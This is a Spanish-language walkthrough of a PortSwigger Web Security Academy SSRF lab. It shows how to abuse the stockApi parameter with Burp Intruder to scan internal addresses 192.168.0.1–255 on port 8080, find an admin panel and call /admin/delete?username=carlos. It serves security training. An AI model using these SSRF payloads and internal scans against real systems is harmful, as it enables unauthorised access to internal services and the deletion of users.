# Lab — Basic SSRF against another back-end system

> **Fuente principal:** solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

La función **Check stock** puede hacer peticiones a sistemas internos.

Debemos usarla para encontrar qué host del rango:

```text
192.168.0.X
```

tiene un panel administrativo escuchando en:

```text
port 8080
```

Después debemos eliminar a:

```text
carlos
```

---

# Qué está enseñando PortSwigger

El servidor vulnerable puede acceder a una red interna que nuestro navegador no puede alcanzar directamente.

```text
Nuestro navegador
      ↓
servidor vulnerable
      ↓
192.168.0.1
192.168.0.2
192.168.0.3
...
192.168.0.255
```

La vulnerabilidad SSRF convierte al servidor en un intermediario para consultar esos hosts internos.

---

# Procedimiento oficial paso a paso

## Paso 1 — Abrir un producto

1. Abre cualquier producto.
2. En Burp activa:

```text
Proxy
→ Intercept
→ Intercept is ON
```

3. En el navegador pulsa:

```text
Check stock
```

---

## Paso 2 — Localizar `stockApi`

La request debe contener un body parecido a:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://...
```

El parámetro vulnerable vuelve a ser:

```text
stockApi
```

---

## Paso 3 — Send to Intruder

Con esa request:

```text
clic derecho
→ Send to Intruder
```

Después puedes hacer Forward y apagar Intercept para que el navegador no quede bloqueado.

Abre:

```text
Intruder
```

---

## Paso 4 — Preparar la IP interna

Cambia el valor de `stockApi` a:

```text
http://192.168.0.1:8080/admin
```

Ahora necesitamos variar **solo el último octeto**.

Debe quedar conceptualmente:

```text
http://192.168.0.§1§:8080/admin
```

Para hacerlo:

1. pulsa `Clear §` si Burp agregó otras posiciones;
2. selecciona solamente el último `1` de `192.168.0.1`;
3. pulsa `Add §`.

No marques todo el parámetro.

---

## Paso 5 — Configurar Payloads como Numbers

En el panel **Payloads**:

```text
Payload type → Numbers
```

Configura:

```text
From: 1
To:   255
Step: 1
```

Esto hará que Intruder pruebe:

```text
192.168.0.1:8080/admin
192.168.0.2:8080/admin
192.168.0.3:8080/admin
...
192.168.0.255:8080/admin
```

---

## Paso 6 — Start attack

Pulsa:

```text
Start attack
```

Espera a que aparezcan los resultados.

---

# Qué buscar en los resultados

PortSwigger indica ordenar por:

```text
Status code
```

Haz clic en la columna para ordenar de forma ascendente.

La mayoría de los hosts no devolverán el mismo resultado que el panel admin.

Debes encontrar **una entrada con HTTP 200** correspondiente al host que tiene `/admin` disponible.

Ejemplo conceptual:

```text
Payload   Status
1         500
2         500
...
42        200   ← interesa
...
255       500
```

El número `42` es solo un ejemplo. Debes usar el que aparezca en tu instancia.

---

## Paso 7 — Confirmar el panel

Selecciona la fila con `200`.

Revisa la **Response** y confirma que contiene el panel administrativo.

Busca:

```text
Admin
Users
carlos
Delete
```

---

## Paso 8 — Send to Repeater

Sobre la request que devolvió `200`:

```text
clic derecho
→ Send to Repeater
```

Abre:

```text
Repeater
```

Ahora ya conocemos la IP correcta.

Supongamos, solo como ejemplo:

```text
192.168.0.42
```

La request contiene:

```text
stockApi=http://192.168.0.42:8080/admin
```

---

## Paso 9 — Eliminar a `carlos`

Mantén exactamente la IP encontrada y cambia únicamente el path:

```text
/admin
```

por:

```text
/admin/delete?username=carlos
```

Queda:

```text
stockApi=http://192.168.0.IP_ENCONTRADA:8080/admin/delete?username=carlos
```

Pulsa:

```text
Send
```

Con eso el lab debería marcarse como **Solved**.

---

# Qué habilidad nueva de Intruder aprendemos

En Authentication usamos:

```text
Payload type = Simple list
```

para probar usernames/passwords.

Aquí usamos:

```text
Payload type = Numbers
```

para recorrer una parte numérica de una IP.

La lógica de Intruder sigue siendo la misma:

```text
marcar qué cambia con §...§
        ↓
definir qué valores probar
        ↓
Start attack
        ↓
buscar una respuesta diferente
```

---

# Por qué funciona

El sistema administrativo no está expuesto públicamente, pero sí se encuentra en una red que el servidor vulnerable puede alcanzar.

```text
nosotros ──X──> 192.168.0.X:8080

nosotros
   ↓
stockApi
   ↓
servidor vulnerable ──> 192.168.0.X:8080
```

El servidor actúa como puente hacia la red interna.

---

# Errores comunes en este lab

- Marcar toda la URL como payload position en vez del último octeto.
- Usar `Simple list` cuando el procedimiento oficial pide `Numbers`.
- Olvidar el puerto `8080`.
- Probar `/` en vez de `/admin` y luego no saber qué respuesta buscar.
- Buscar solamente por `Length` cuando PortSwigger indica ordenar por `Status code`.
- Cambiar la IP correcta después de encontrarla.

---

# Checklist

- [ ] Intercepté `Check stock`.
- [ ] Encontré `stockApi`.
- [ ] Envié la request a Intruder.
- [ ] Marqué solo el último octeto.
- [ ] Configuré `Numbers: 1-255, step 1`.
- [ ] Encontré la entrada `200`.
- [ ] Confirmé el admin panel en la Response.
- [ ] Envié esa request a Repeater.
- [ ] Añadí `/admin/delete?username=carlos`.
- [ ] Entiendo por qué el servidor puede alcanzar una IP que yo no puedo.

---

# Resumen de 20 segundos

```text
Check stock
    ↓
Send to Intruder
    ↓
stockApi=http://192.168.0.§1§:8080/admin
    ↓
Numbers 1 → 255
    ↓
Start attack
    ↓
buscar Status 200
    ↓
Send to Repeater
    ↓
/admin/delete?username=carlos
    ↓
Solved
```
